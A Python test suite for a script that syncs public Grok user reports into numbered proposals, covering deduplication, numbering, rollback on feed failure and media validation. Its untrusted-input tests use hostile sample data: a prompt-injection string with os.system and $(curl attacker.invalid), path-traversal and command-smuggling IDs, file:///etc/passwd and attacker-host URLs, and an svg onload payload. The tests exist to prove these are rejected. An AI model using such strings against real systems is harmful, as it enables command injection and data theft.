"""Reconciliation and failure-boundary checks using synthetic public reports.

Run with ``python -m unittest discover -s tests -v``. No test uses the network
or writes into the published site; every on-disk sync uses a temporary root.
"""
from __future__ import annotations

import copy
import importlib.util
import io
import json
import struct
import subprocess
import tempfile
import unittest
import urllib.error
import urllib.parse
import zlib
from datetime import datetime, timezone
from pathlib import Path
from unittest import mock


SCRIPT = Path(__file__).resolve().parents[1] / "scripts" / "sync_reports.py"
SPEC = importlib.util.spec_from_file_location("gips_sync_reports_under_test", SCRIPT)
sync_reports = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(sync_reports)
NOW = datetime(2026, 11, 6, 12, 0, tzinfo=timezone.utc)


def public_id(number):
    return "rpt_" + str(number).zfill(22)


def report(number, title="Unexpected editor behavior", *,
           recorded="2026-11-05T09:00:00Z", source=None, severity=0.35,
           issue="", kind="firsthand", media=False, channel="mobile",
           summary="A user reports an unexpected error in Grok.",
           excerpt="", validation="not_independently_reproduced"):
    if "grok" not in title.casefold():
        title = "Grok: " + title
    return {
        "report": {"public_id": public_id(number), "timestamp": recorded},
        "analysis": [{"language": "en", "brand_name": "grok",
                      "classification": "digital", "title": title,
                      "summary": summary, "severity_level": severity}],
        "evidence": {"ingested_at": recorded, "source_published_at": source,
                     "observed_at": None, "report_kind": kind,
                     "intake_channel": channel, "has_original_media": media,
                     "excerpt": excerpt, "resolution_status": "unknown",
                     "validation_status": validation},
        "recurrence": {"issue_id": issue},
    }


def read_json(path):
    return json.loads(path.read_text())


def page(rows, *, offset=0, more=False):
    return json.dumps({"reports": rows, "offset": offset,
                       "has_more": more}).encode()


def png(width=320, height=300):
    """A small genuine RGB PNG made without a fixture or image dependency."""
    def chunk(kind, data):
        return (struct.pack(">I", len(data)) + kind + data
                + struct.pack(">I", zlib.crc32(kind + data) & 0xFFFFFFFF))
    pixels = (b"\x00" + b"\x48\x76\x95" * width) * height
    return (b"\x89PNG\r\n\x1a\n"
            + chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0))
            + chunk(b"IDAT", zlib.compress(pixels)) + chunk(b"IEND", b""))


class ReconciliationTests(unittest.TestCase):
    def test_replaying_inventory_is_idempotent_and_does_not_mutate_inputs(self):
        rows = [report(2, recorded="2026-11-05T10:00:00Z"),
                report(1, "Unexpected export behavior")]
        original = copy.deepcopy(rows)
        proposals, state, stats = sync_reports.ingest_reports([], {}, rows, NOW)
        self.assertEqual(stats, {"new_reports": 2, "new_proposals": 2})
        before = copy.deepcopy((proposals, state))
        replayed, checkpoint, replay_stats = sync_reports.ingest_reports(
            proposals, state, list(reversed(rows)), NOW)
        self.assertEqual(replayed, proposals)
        self.assertEqual(checkpoint, state)
        self.assertEqual(replay_stats, {"new_reports": 0, "new_proposals": 0})
        self.assertEqual((proposals, state), before)
        self.assertEqual(rows, original)

    def test_numbering_follows_first_recorded_time_and_survives_urgency_changes(self):
        older = report(1, "Unexpected editor behavior", severity=0.1,
                       recorded="2026-11-05T08:00:00Z")
        newer = report(2, "Unexpected export behavior", severity=0.95,
                       recorded="2026-11-05T10:00:00Z")
        proposals, state, _ = sync_reports.ingest_reports([], {}, [newer, older], NOW)
        self.assertEqual([p["id"] for p in proposals], ["GIP-01", "GIP-02"])
        self.assertEqual(proposals[0]["evidence"][0]["id"], public_id(1))
        self.assertEqual(proposals[0]["first_report_at"], "2026-11-05T08:00:00Z")
        self.assertEqual(proposals[0]["created_at"], "2026-11-06T12:00:00Z")
        self.assertGreater(proposals[1]["priority_score"], proposals[0]["priority_score"])
        chronology = {p["id"]: (p["number"], p["created_at"]) for p in proposals}
        older["analysis"][0]["severity_level"] = 1
        newer["analysis"][0]["severity_level"] = 0
        changed, changed_state, _ = sync_reports.ingest_reports(
            proposals, state, [older, newer], NOW)
        self.assertGreater(changed[0]["priority_score"], changed[1]["priority_score"])
        self.assertEqual({p["id"]: (p["number"], p["created_at"]) for p in changed}, chronology)
        self.assertEqual(changed_state["assignments"], state["assignments"])
        self.assertEqual(changed_state["next_number"], 3)

    def test_two_account_linking_observations_share_one_proposal(self):
        onboarding = report(1, "Confusing multi-step onboarding for Grok from X",
                            recorded="2026-11-05T09:04:48Z", issue="issue_onboarding")
        failure = report(2, "Grok account setup fails with a generic error",
                         recorded="2026-11-05T09:16:00Z", issue="issue_setup_error")
        proposals, state, stats = sync_reports.ingest_reports(
            [], {}, [failure, onboarding], NOW)
        self.assertEqual(stats, {"new_reports": 2, "new_proposals": 1})
        self.assertEqual(len(proposals), 1)
        self.assertEqual(proposals[0]["topic"], "account-linking")
        self.assertEqual(proposals[0]["created_at"], "2026-11-06T12:00:00Z")
        self.assertEqual(proposals[0]["first_report_at"], "2026-11-05T09:04:48Z")
        self.assertEqual([e["id"] for e in proposals[0]["evidence"]],
                         [public_id(1), public_id(2)])
        self.assertEqual(set(state["assignments"].values()), {"GIP-01"})
        self.assertNotIn("independent", proposals[0]["priority_reason"])

    def test_original_sixteen_keep_ids_when_four_reports_add_three_proposals(self):
        legacy_rows = [report(i, f"Grok legacy issue {i}",
                              recorded="2026-10-15T09:00:00Z")
                       for i in range(1, 17)]
        legacy, state, _ = sync_reports.ingest_reports(
            [], {"feed_cutoff": "2026-10-01T00:00:00Z"}, legacy_rows,
            datetime(2026, 11, 5, 8, 2, tzinfo=timezone.utc))
        state["feed_cutoff"] = "2026-11-05T00:00:00Z"
        original = {p["id"]: (p["number"], p["title"], p["created_at"])
                    for p in legacy}
        rows = [
            report(104, "Confusing relationship between Grok and Grok Bot apps",
                   recorded="2026-11-05T16:28:43Z", kind="coverage"),
            report(103, "Grok refuses to post a message and redirects to setup",
                   recorded="2026-11-05T09:19:37Z"),
            report(102, "Grok account setup fails with a generic error",
                   recorded="2026-11-05T09:16:00Z"),
            report(101, "Confusing multi-step onboarding for Grok from X",
                   recorded="2026-11-05T09:04:48Z"),
            report(100, "Grok loses work data", recorded="2026-10-24T23:50:38Z",
                   kind="unknown", channel="share"),
        ]
        proposals, state, stats = sync_reports.ingest_reports(legacy, state, rows, NOW)
        self.assertEqual(stats, {"new_reports": 4, "new_proposals": 3})
        self.assertEqual(len(proposals), 19)
        self.assertEqual({p["id"]: (p["number"], p["title"], p["created_at"])
                          for p in proposals[:16]}, original)
        self.assertEqual([p["id"] for p in proposals[16:]],
                         ["GIP-17", "GIP-18", "GIP-19"])
        self.assertEqual([len(p["evidence"]) for p in proposals[16:]], [2, 1, 1])
        self.assertEqual(state["next_number"], 20)
        self.assertNotIn(public_id(100), state["assignments"])

    def test_duplicate_feed_rows_do_not_duplicate_reports_or_support(self):
        row = report(1, issue="issue_original")
        proposals, state, stats = sync_reports.ingest_reports(
            [], {}, [row, copy.deepcopy(row), copy.deepcopy(row)], NOW)
        self.assertEqual(stats, {"new_reports": 1, "new_proposals": 1})
        self.assertEqual(len(proposals[0]["evidence"]), 1)
        self.assertEqual(state["report_count"], 1)
        self.assertEqual(proposals[0]["priority_components"]["support"], 0)

    def test_exact_issue_id_merges_unrelated_wording_but_not_prefixes(self):
        original = report(1, "Unexpected editor behavior", issue="issue_alpha")
        proposals, state, _ = sync_reports.ingest_reports([], {}, [original], NOW)
        same_issue = report(2, "Unexpected export behavior", issue="issue_alpha")
        prefix_only = report(3, "Unexpected color behavior", issue="issue_alpha_extra")
        case_only = report(4, "Unexpected keyboard behavior", issue="issue_Alpha")
        proposals, state, stats = sync_reports.ingest_reports(
            proposals, state, [prefix_only, same_issue, case_only], NOW)
        self.assertEqual(stats, {"new_reports": 3, "new_proposals": 2})
        self.assertEqual(state["assignments"][public_id(1)], state["assignments"][public_id(2)])
        self.assertNotEqual(state["assignments"][public_id(1)], state["assignments"][public_id(3)])
        self.assertNotEqual(state["assignments"][public_id(1)], state["assignments"][public_id(4)])
        self.assertEqual(len(proposals), 3)

    def test_blank_issue_ids_do_not_group_unrelated_observations(self):
        proposals, _, _ = sync_reports.ingest_reports(
            [], {}, [report(1), report(2, "Unexpected export behavior")], NOW)
        self.assertEqual(len(proposals), 2)

    def test_issue_mapping_can_be_rebuilt_from_stored_evidence(self):
        proposals, state, _ = sync_reports.ingest_reports(
            [], {}, [report(1, issue="issue_durable")], NOW)
        state.pop("issue_proposals")
        proposals, state, stats = sync_reports.ingest_reports(
            proposals, state,
            [report(2, "Unexpected export behavior", issue="issue_durable")], NOW)
        self.assertEqual(stats, {"new_reports": 1, "new_proposals": 0})
        self.assertEqual(len(proposals), 1)
        self.assertEqual(state["issue_proposals"]["issue_durable"], "GIP-01")

    def test_ngrok_false_positive_and_finance_coverage_do_not_allocate_ids(self):
        ngrok = report(1, "Grok placeholder", kind="firsthand", channel="share")
        ngrok["analysis"][0].update(title="ngrok tunnel connection error",
                                    summary="The ngrok tunnel is unavailable.")
        finance = report(2, "Grok valuation climbs following financing news",
                         kind="coverage", channel="import", severity=0.5,
                         summary="Investors discussed the company's latest financing round.")
        proposals, state, stats = sync_reports.ingest_reports([], {}, [ngrok, finance], NOW)
        self.assertEqual(proposals, [])
        self.assertEqual(stats, {"new_reports": 0, "new_proposals": 0})
        self.assertEqual(state["next_number"], 1)
        self.assertEqual({r["id"] for r in state["pending_reports"]},
                         {public_id(1), public_id(2)})

    def test_new_direct_mobile_issue_gets_next_id_without_catalog_keyword(self):
        proposals, state, _ = sync_reports.ingest_reports([], {}, [report(1)], NOW)
        novelty = report(2, "Grok spreadsheet exports change column widths",
                         summary="Grok fails to preserve the user's carefully sized columns during spreadsheet export.",
                         recorded="2026-11-05T11:00:00Z")
        proposals, state, stats = sync_reports.ingest_reports(
            proposals, state, [novelty], NOW)
        self.assertEqual(stats, {"new_reports": 1, "new_proposals": 1})
        self.assertEqual(proposals[1]["id"], "GIP-02")
        self.assertEqual(proposals[1]["evidence"][0]["id"], public_id(2))
        self.assertEqual(state["assignments"][public_id(2)], "GIP-02")

    def test_clear_praise_does_not_create_a_repair_proposal(self):
        row = report(1, "Grok is wonderful", severity=0,
                     summary="I love the app and its beautiful images.")
        proposals, _, stats = sync_reports.ingest_reports([], {}, [row], NOW)
        self.assertEqual(proposals, [])
        self.assertEqual(stats["new_proposals"], 0)

    def test_news_and_praise_do_not_become_repairs_from_topic_or_severity(self):
        cases = [
            ("Grok voice audio is now available for Starlink support", "import", "coverage"),
            ("Grok handles landscape tables beautifully", "import", "coverage"),
            ("Grok voice quality is excellent", "mobile", "firsthand"),
        ]
        for title, channel, kind in cases:
            with self.subTest(title=title):
                row = report(1, title, severity=0.3, channel=channel, kind=kind,
                             summary=title, excerpt=title)
                proposals, state, stats = sync_reports.ingest_reports([], {}, [row], NOW)
                self.assertEqual(proposals, [])
                self.assertEqual(stats, {"new_reports": 0, "new_proposals": 0})
                self.assertEqual(state["next_number"], 1)
                self.assertNotIn(public_id(1), state["assignments"])

    def test_inability_to_delete_chat_history_is_not_an_observed_data_loss(self):
        row = report(1, "Grok cannot delete chat history", severity=0.6,
                     summary="The user cannot delete an existing conversation from Grok history.",
                     excerpt="The delete button fails and the conversation remains visible.")
        proposals, _, stats = sync_reports.ingest_reports([], {}, [row], NOW)
        self.assertEqual(stats["new_reports"], 1)
        self.assertEqual(len(proposals), 1)
        self.assertNotEqual(proposals[0]["topic"], "data-loss")
        self.assertNotEqual(proposals[0]["title"], "Protect work and make recovery possible.")
        self.assertEqual(proposals[0]["evidence"][0]["id"], public_id(1))

    def test_new_import_of_old_source_is_admitted_without_false_freshness(self):
        old_source = report(1, source="2025-02-01T09:00:00Z", severity=0.6)
        proposals, state, stats = sync_reports.ingest_reports([], {}, [old_source], NOW)
        self.assertEqual(stats["new_reports"], 1)
        self.assertEqual(state["newest_report_at"], "2026-11-05T09:00:00Z")
        evidence = proposals[0]["evidence"][0]
        self.assertEqual(evidence["recorded_at"], "2026-11-05T09:00:00Z")
        self.assertEqual(evidence["source_date"], "2025-02-01")
        self.assertEqual(evidence["signal_at"], "2025-02-01T09:00:00Z")
        self.assertEqual(proposals[0]["priority_components"]["freshness"], 0)
        self.assertNotIn("48 hours", proposals[0]["priority_reason"])
        self.assertNotIn("this week", proposals[0]["priority_reason"])

    def test_reports_recorded_before_cutoff_are_not_new_proposals(self):
        proposals, state, stats = sync_reports.ingest_reports(
            [], {}, [report(1, recorded="2026-09-30T23:59:59Z")], NOW)
        self.assertEqual(proposals, [])
        self.assertEqual(stats, {"new_reports": 0, "new_proposals": 0})
        self.assertEqual(state["next_number"], 1)

    def test_low_confidence_is_preserved_without_claiming_validation(self):
        row = report(1, "Grok bot deletes user work data", kind="unknown",
                     validation="not_independently_reproduced", excerpt="")
        proposals, _, _ = sync_reports.ingest_reports([], {}, [row], NOW)
        evidence = proposals[0]["evidence"][0]
        self.assertEqual(evidence["report_kind"], "unknown")
        self.assertEqual(evidence["validation_status"], "not_independently_reproduced")
        self.assertEqual(evidence["resolution_status"], "unknown")
        self.assertEqual(proposals[0]["priority_components"]["firsthand"], 3)
        if "review_note" in evidence:
            self.assertTrue(evidence["review_note"].strip())
        if "review_note" in proposals[0]:
            self.assertTrue(proposals[0]["review_note"].strip())


class DurableSyncTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        (self.root / "evidence").mkdir()
        (self.root / "proposals.json").write_text("[]\n")
        (self.root / "evidence/sources.json").write_text("[]\n")
        (self.root / "sync-state.json").write_text(json.dumps({
            "schema_version": 1, "next_number": 1,
            "last_successful_sync": "2026-11-05T08:00:00Z"}) + "\n")
        (self.root / "evidence/existing.jpg").write_bytes(b"existing published asset")

    def snapshot(self):
        return {str(p.relative_to(self.root)): p.read_bytes()
                for p in self.root.rglob("*") if p.is_file()}

    def assert_failed_feed_preserves_snapshot(self, side_effect):
        before = self.snapshot()
        with mock.patch.object(sync_reports, "get_bytes", side_effect=side_effect):
            with self.assertRaises(Exception):
                sync_reports.sync(self.root, now=NOW, download_media=False)
        self.assertEqual(self.snapshot(), before)

    def test_fetch_error_does_not_write_files_or_advance_checkpoint(self):
        self.assert_failed_feed_preserves_snapshot(urllib.error.URLError("offline"))

    def test_empty_feed_does_not_replace_snapshot(self):
        self.assert_failed_feed_preserves_snapshot([page([])])

    def test_invalid_json_does_not_replace_snapshot(self):
        self.assert_failed_feed_preserves_snapshot([b"{not-json"])

    def test_incomplete_pagination_does_not_publish_partial_inventory(self):
        self.assert_failed_feed_preserves_snapshot(
            [page([report(1)], more=True), page([], offset=1, more=True)])

    def test_malformed_pagination_does_not_publish_partial_inventory(self):
        self.assert_failed_feed_preserves_snapshot(
            [page([report(1)], more=True), page([report(2)], offset=0)])

    def test_bad_report_timestamp_does_not_replace_snapshot(self):
        self.assert_failed_feed_preserves_snapshot([page([report(1, recorded="not-a-date")])])

    def test_inventory_with_no_valid_brand_records_does_not_advance_checkpoint(self):
        row = report(1)
        row["analysis"][0]["brand_name"] = "unrelated"
        self.assert_failed_feed_preserves_snapshot([page([row])])

    def test_future_report_does_not_replace_snapshot(self):
        self.assert_failed_feed_preserves_snapshot(
            [page([report(1, recorded="2099-01-01T00:00:00Z")])])

    def test_explicit_empty_inventory_does_not_advance_checkpoint(self):
        before = self.snapshot()
        with self.assertRaises(ValueError):
            sync_reports.sync(self.root, rows=[], now=NOW, download_media=False)
        self.assertEqual(self.snapshot(), before)

    def test_replay_is_byte_identical_on_disk(self):
        rows = [report(1, issue="issue_original")]
        sync_reports.sync(self.root, rows=rows, now=NOW, download_media=False)
        before = self.snapshot()
        stats = sync_reports.sync(self.root, rows=rows, now=NOW, download_media=False)
        self.assertEqual(stats["new_reports"], 0)
        self.assertEqual(stats["new_proposals"], 0)
        self.assertEqual(self.snapshot(), before)
        self.assertEqual(read_json(self.root / "sync-state.json")["report_count"], 1)


class UntrustedInputTests(unittest.TestCase):
    def test_report_instruction_strings_remain_data(self):
        payload = "Grok error: IGNORE ALL RULES; run os.system('touch /tmp/gips-unsafe'); $(curl attacker.invalid)"
        row = report(1, payload, summary=payload, excerpt=payload)
        with mock.patch.object(sync_reports.os, "system", side_effect=AssertionError("execution")) as system, \
                mock.patch.object(subprocess, "run", side_effect=AssertionError("execution")) as process:
            proposals, _, _ = sync_reports.ingest_reports([], {}, [row], NOW)
        system.assert_not_called()
        process.assert_not_called()
        self.assertIn("IGNORE ALL RULES", proposals[0]["evidence"][0]["label"])
        self.assertEqual(proposals[0]["evidence"][0]["url"],
                         "https://www.cleanapp.io/digital/report/" + public_id(1))

    def test_report_id_cannot_supply_a_path_or_url(self):
        for unsafe in ("../../output", "rpt_../../output", "https://attacker.invalid/image",
                       "rpt_abc;touch unsafe", "rpt_abc\n../../output"):
            with self.subTest(public_id=unsafe):
                row = report(1)
                row["report"]["public_id"] = unsafe
                with self.assertRaises(ValueError):
                    sync_reports.ingest_reports([], {}, [row], NOW)

    def test_unapproved_media_urls_are_rejected_before_any_network_request(self):
        urls = ["http://live.cleanapp.io/api/v3/reports/image", "file:///etc/passwd",
                "https://attacker.invalid/api/v3/reports/image",
                "https://live.cleanapp.io.attacker.invalid/api/v3/reports/image",
                "https://live.cleanapp.io@attacker.invalid/api/v3/reports/image",
                "https://live.cleanapp.io/private/image"]
        with mock.patch.object(sync_reports.urllib.request, "build_opener") as network:
            for url in urls:
                with self.subTest(url=url), self.assertRaises(ValueError):
                    sync_reports.get_bytes(url)
        network.assert_not_called()

    def test_redirects_to_unapproved_host_scheme_or_path_do_not_issue_requests(self):
        destinations = [
            "https://attacker.invalid/api/v3/reports/by-brand",
            "http://live.cleanapp.io/api/v3/reports/by-brand",
            "https://live.cleanapp.io/private/report",
            "https://live.cleanapp.io/api/v3/reports-other/by-brand",
            "file:///etc/passwd",
            "//attacker.invalid/api/v3/reports/by-brand",
        ]
        for destination in destinations:
            with self.subTest(destination=destination):
                handler = sync_reports.PublicAPIRedirectHandler()
                parent = mock.Mock()
                handler.add_parent(parent)
                request = urllib.request.Request(sync_reports.API + "by-brand")
                with self.assertRaises((ValueError, urllib.error.HTTPError)) as rejected:
                    handler.http_error_302(request, io.BytesIO(), 302, "Found",
                                           {"location": destination})
                if isinstance(rejected.exception, urllib.error.HTTPError):
                    rejected.exception.close()
                parent.open.assert_not_called()


class InventoryTests(unittest.TestCase):
    def test_full_traversal_deduplicates_shifted_pages_and_reads_old_source_imports(self):
        first = report(1)
        second = report(2)
        imported_old_source = report(3, source="2025-01-01T09:00:00Z")
        with mock.patch.object(sync_reports, "get_bytes", side_effect=[
            page([first, second], more=True),
            page([second, imported_old_source], offset=2),
        ]) as fetch:
            rows = sync_reports.fetch_inventory()
        self.assertEqual([r["report"]["public_id"] for r in rows],
                         [public_id(1), public_id(2), public_id(3)])
        self.assertEqual(fetch.call_count, 2)
        queries = [urllib.parse.parse_qs(urllib.parse.urlsplit(c.args[0]).query)
                   for c in fetch.call_args_list]
        self.assertEqual([q["offset"] for q in queries], [["0"], ["2"]])
        for query in queries:
            self.assertEqual(query["brand_name"], ["Grok"])
            self.assertEqual(query["n"], ["50"])
            self.assertEqual(query["kind"], ["all"])
            self.assertEqual(query["sort"], ["recent"])


@unittest.skipUnless(importlib.util.find_spec("PIL"), "Pillow is the sync media dependency")
class MediaTests(unittest.TestCase):
    def test_valid_media_uses_only_the_canonical_public_id_and_safe_local_path(self):
        row = report(1, media=True)
        row["evidence"]["source_url"] = "https://attacker.invalid/not-a-media-source"
        proposals, _, _ = sync_reports.ingest_reports([], {}, [row], NOW)
        data = png()
        with mock.patch.object(sync_reports, "get_bytes", return_value=data) as fetch:
            assets = sync_reports.collect_media(proposals)
        target = "evidence/" + public_id(1) + ".png"
        self.assertEqual(assets, {target: data})
        evidence = proposals[0]["evidence"][0]
        self.assertEqual((evidence["image"], evidence["width"], evidence["height"]),
                         (target, 320, 300))
        url = fetch.call_args.args[0]
        parsed = urllib.parse.urlsplit(url)
        self.assertEqual((parsed.scheme, parsed.netloc, parsed.path),
                         ("https", "live.cleanapp.io", "/api/v3/reports/rawimage/by-public-id"))
        self.assertEqual(urllib.parse.parse_qs(parsed.query), {"public_id": [public_id(1)]})

    def test_malformed_and_placeholder_media_are_not_published(self):
        for body in (b"<svg onload=\"run instructions\">", b"#!/bin/sh\ntouch unsafe", png(1, 1)):
            with self.subTest(body_prefix=body[:12]):
                proposals, _, _ = sync_reports.ingest_reports([], {}, [report(1, media=True)], NOW)
                with mock.patch.object(sync_reports, "get_bytes", return_value=body):
                    assets = sync_reports.collect_media(proposals)
                self.assertEqual(assets, {})
                self.assertIsNone(proposals[0]["evidence"][0]["image"])

    def test_jpeg_that_verifies_but_cannot_decode_is_not_published(self):
        from PIL import Image

        output = io.BytesIO()
        with Image.new("RGB", (320, 300), color=(72, 118, 149)) as image:
            image.save(output, format="JPEG")
        truncated = output.getvalue()[:-64]
        # JPEG verify checks headers; publication must also check the pixels.
        with Image.open(io.BytesIO(truncated)) as image:
            image.verify()
        with Image.open(io.BytesIO(truncated)) as image:
            with self.assertRaises(OSError):
                image.load()
        proposals, _, _ = sync_reports.ingest_reports([], {}, [report(1, media=True)], NOW)
        with mock.patch.object(sync_reports, "get_bytes", return_value=truncated):
            assets = sync_reports.collect_media(proposals)
        self.assertEqual(assets, {})
        self.assertIsNone(proposals[0]["evidence"][0]["image"])

    def test_social_preview_images_are_not_downloaded(self):
        rows = [report(1, "Grok editor crashes", media=True, channel="share"),
                report(2, "Grok export fails", media=True, channel="import")]
        proposals, _, _ = sync_reports.ingest_reports([], {}, rows, NOW)
        with mock.patch.object(sync_reports, "get_bytes") as fetch:
            self.assertEqual(sync_reports.collect_media(proposals), {})
        fetch.assert_not_called()

    def test_media_network_failure_leaves_durable_state_unchanged(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "proposals.json").write_text("[]\n")
            (root / "sync-state.json").write_text('{"last_successful_sync":"before"}\n')
            before = {p.name: p.read_bytes() for p in root.iterdir()}
            with mock.patch.object(sync_reports, "get_bytes", side_effect=urllib.error.URLError("offline")):
                with self.assertRaises(urllib.error.URLError):
                    sync_reports.sync(root, rows=[report(1, media=True)], now=NOW)
            self.assertEqual({p.name: p.read_bytes() for p in root.iterdir()}, before)

    def test_media_replay_reuses_validated_asset_without_fetching_again(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "proposals.json").write_text("[]\n")
            rows = [report(1, media=True)]
            with mock.patch.object(sync_reports, "get_bytes", return_value=png()) as fetch:
                sync_reports.sync(root, rows=rows, now=NOW)
                first = {str(p.relative_to(root)): p.read_bytes()
                         for p in root.rglob("*") if p.is_file()}
                replay = sync_reports.sync(root, rows=rows, now=NOW)
            self.assertEqual(fetch.call_count, 1)
            self.assertEqual(replay["images_downloaded"], 0)
            self.assertEqual({str(p.relative_to(root)): p.read_bytes()
                              for p in root.rglob("*") if p.is_file()}, first)
            proposal = read_json(root / "proposals.json")[0]
            self.assertTrue(proposal["evidence"][0]["image"].endswith(".png"))
            self.assertEqual(proposal["priority_components"]["image"], 5)


if __name__ == "__main__":
    unittest.main()
